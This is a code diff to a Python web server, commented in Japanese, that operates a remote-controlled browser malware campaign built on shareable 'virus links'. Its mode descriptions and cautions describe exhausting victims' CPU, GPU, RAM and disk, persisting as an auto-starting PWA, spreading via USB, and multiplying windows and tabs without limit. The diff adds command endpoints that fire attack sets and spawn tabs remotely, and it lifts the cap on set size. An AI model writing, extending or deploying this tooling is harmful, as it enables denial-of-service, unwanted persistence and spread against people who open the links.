@@ -3,7 +3,7 @@
 モード: trojan_link / trojan_install / max_power / brick / windows / storage / mix / singularity
 
 監視室: /vp/{code}（AJAX・遷移なし）
-API: /api/vp/{code}/state|stages|rat|winlock|win|hard|hit/{id}/bot|breed
+API: /api/vp/{code}/state|stages|rat|winlock|win|hard|hit/{id}/bot|breed|fire1
 """
 from __future__ import annotations
 
@@ -52,7 +52,7 @@ MODE_DESC = {
     "singularity": "全46系統・8資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、"
                    "メインスレッドを凍結し、PWAとして端末に常駐インストールされる。"
                    "相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜7を遠隔変更できる。"
-                   "L7は固定枠で、窓が指数増殖し、各窓がヘビースキンで高火力化し、"
+                   "L7は固定枠で、窓もタブも指数増殖し、各窓がヘビースキンで高火力化し、"
                    "OS常駐インストーラによりブラウザの外まで侵食する。",
 }
 
@@ -71,7 +71,7 @@ CAUTION = {
     "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、"
                    "タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。"
                    "相手のUSBにも仕込んで伝染する。レベルは監視室から遠隔操作。L7「絶滅」は固定枠で、"
-                   "立てたら遠隔から下げられない。窓がリミッターなしで倍々に増え続け、OS常駐インストーラを配る。"
+                   "立てたら遠隔から下げられない。窓もタブもリミッターなしで倍々に増え続け、OS常駐インストーラを配る。"
                    "停止・凍結中でもService Worker経由で命令が届く。",
 }
 
@@ -235,6 +235,17 @@ def _val(row, key, default):
         return default
 
 
+def _ws(v, default: int = 100) -> int:
+    """1セットの枚数。0 = ∞。1〜500 は自由入力。"""
+    try:
+        ws = int(v)
+    except Exception:
+        return default
+    if ws == 0:
+        return 0
+    return max(1, min(500, ws))
+
+
 def _is_fixed(row):
     try:
         return bool(int(_val(row, "fixed", 0) or 0))
@@ -333,11 +344,7 @@ def create(request: Request, name: str = Form(""), mode: str = Form("mix"),
     m = _norm_mode(mode)
     nm = _norm_mode(notify_mode) if notify_mode else ""
     fx = 0 if str(fixed) in ("0", "", "false", "False") else 1
-    try:
-        ws = int(winset)
-    except Exception:
-        ws = 100
-    ws = ws if ws in SET_CHOICES else 100
+    ws = _ws(winset)
     ntext = (notify_text or DEFAULT_NOTIFY)[:300]
     c.execute("INSERT INTO virus_links(code,name,mode,dest,note,active,created,hits,"
               "winset,firing,notify,notify_text,notify_mode,level,fixed,ver) "
@@ -451,11 +458,12 @@ def land(code: str, request: Request):
 
     return _render(
         "virus.html", request,
-        code=code, link=dict(row), hit=hid, base=_base(request),
+        code=code, link=dict(row), hit_id=hid, base=_base(request),
         mode=mode, mode_label=MODE_LABEL.get(mode, mode),
         caution=CAUTION.get(mode, ""),
         dest=_abs_dest(row["dest"]), is_child=child, is_installed=installed,
         winset=_val(row, "winset", 100), firing=_val(row, "firing", 1),
+        seq=_val(row, "seq", 0), auto=(mode in AUTO_MODES),
         notify=notify, notify_text=notify_text, install_mode=install_mode,
         child_text=random.choice([
             "システム警告", "メモリ不足", "ディスク容量が危険です", "異常を検出しました",
@@ -1236,11 +1244,7 @@ def resume(code: str, u=Depends(_auth)):
 @router.post("/vp/{code}/set")
 def set_size(code: str, winset: str = Form("100"), u=Depends(_auth)):
     owner = tenancy.get_current() or u
-    try:
-        ws = int(winset)
-    except Exception:
-        ws = 100
-    ws = ws if ws in SET_CHOICES else 100
+    ws = _ws(winset)
     c = _db(owner)
     c.execute("UPDATE virus_links SET winset=? WHERE code=?", (ws, code))
     c.commit()
@@ -1306,6 +1310,7 @@ def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
     return _render("virus_watch.html", request, code=code, link=dict(row), row=dict(row),
                    hits=hits, by_hit=by_hit, base=base, is_new=(new == "1"),
                    stages=stages, stat=stat, sids=sids,
+                   mode=mode,
                    level_labels=_SG_LEVEL_LABEL, level_descs=_SG_LEVEL_DESC,
                    LEVEL_LABEL=_SG_LEVEL_LABEL,
                    mode_label=MODE_LABEL.get(mode, mode),
@@ -1403,11 +1408,7 @@ def update(request: Request, code: str, name: str = Form(""), mode: str = Form("
     if not _link(c, code):
         c.close()
         raise HTTPException(404)
-    try:
-        ws = int(winset)
-    except Exception:
-        ws = 100
-    ws = ws if ws in SET_CHOICES else 100
+    ws = _ws(winset)
     m = _norm_mode(mode)
     nm = _norm_mode(notify_mode) if notify_mode else ""
     c.execute("UPDATE virus_links SET name=?, mode=?, dest=?, note=?, winset=?, "
@@ -1453,13 +1454,19 @@ def _api_state(owner, code):
                      (code,)).fetchone()["n"]
     hn = c.execute("SELECT COUNT(*) n FROM virus_hits WHERE code=?", (code,)).fetchone()["n"]
     # 生存タブ数（payload が報告する auto.live）と自動増殖の状態
-    live, auto_on, auto_tab, auto_win = 0, 1, 0, 0
+    live, auto_on, auto_tab, auto_win, tab_live = 0, 1, 0, 0, 0
     try:
         r = c.execute("SELECT value FROM virus_data WHERE code=? AND key='auto.live' "
                       "ORDER BY id DESC LIMIT 1", (code,)).fetchone()
         live = int(str(r["value"]).strip()) if r and str(r["value"]).strip().isdigit() else 0
     except Exception:
         live = 0
+    try:
+        r = c.execute("SELECT value FROM virus_data WHERE code=? AND key='tabLive' "
+                      "ORDER BY id DESC LIMIT 1", (code,)).fetchone()
+        tab_live = int(str(r["value"]).strip()) if r and str(r["value"]).strip().isdigit() else 0
+    except Exception:
+        tab_live = 0
     for k, dst in (("auto.on", "on"), ("auto.tab", "tab"), ("auto.win", "win")):
         try:
             r = c.execute("SELECT value FROM virus_data WHERE code=? AND key=? "
@@ -1495,6 +1502,7 @@ def _api_state(owner, code):
             "ver": _val(row, "ver", "") or _SG_VER,
             "live": live, "auto_on": auto_on,
             "auto_tab": auto_tab, "auto_win": auto_win,
+            "tab_live": tab_live,
             "hits": hn, "pending": pend, "server": _now()}
 
 
@@ -1573,6 +1581,20 @@ def api_fire(code: str, u=Depends(_auth)):
     return _api_state(owner, code)
 
 
+@router.post("/api/vp/{code}/fire1")
+def api_fire1(code: str, u=Depends(_auth)):
+    """1セットだけ発射（seq を1つ進める。firing は変更しない）"""
+    owner = tenancy.get_current() or u
+    c = _db(owner)
+    if not _link(c, code):
+        c.close()
+        raise HTTPException(404)
+    c.execute("UPDATE virus_links SET seq=COALESCE(seq,0)+1 WHERE code=?", (code,))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
 @router.post("/api/vp/{code}/stop")
 def api_stop(code: str, u=Depends(_auth)):
     owner = tenancy.get_current() or u
@@ -1597,12 +1619,7 @@ def api_resume(code: str, u=Depends(_auth)):
 async def api_set(request: Request, code: str, u=Depends(_auth)):
     owner = tenancy.get_current() or u
     b = await _api_body(request)
-    try:
-        ws = int(b.get("winset"))
-    except Exception:
-        ws = 100
-    if ws not in SET_CHOICES:
-        ws = 100
+    ws = _ws(b.get("winset"))
     c = _db(owner)
     c.execute("UPDATE virus_links SET winset=? WHERE code=?", (ws, code))
     c.commit()
@@ -1697,6 +1714,26 @@ async def api_breed(request: Request, code: str, u=Depends(_auth)):
         raise HTTPException(404)
     c.execute("INSERT INTO virus_cmd(code,sid,kind,arg,state,ts) VALUES(?,?,?,?,0,?)",
               (code, "", "breed", str(m), _now()))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
+@router.post("/api/vp/{code}/tab")
+async def api_tab(request: Request, code: str, u=Depends(_auth)):
+    """タブを n 枚 直接追加（L3未満でも効く）"""
+    owner = tenancy.get_current() or u
+    b = await _api_body(request)
+    try:
+        n = max(1, min(64, int(b.get("n") or 4)))
+    except Exception:
+        n = 4
+    c = _db(owner)
+    if not _link(c, code):
+        c.close()
+        raise HTTPException(404)
+    c.execute("INSERT INTO virus_cmd(code,sid,kind,arg,state,ts) VALUES(?,?,?,?,0,?)",
+              (code, "", "tab", str(n), _now()))
     c.commit()
     c.close()
     return _api_state(owner, code)
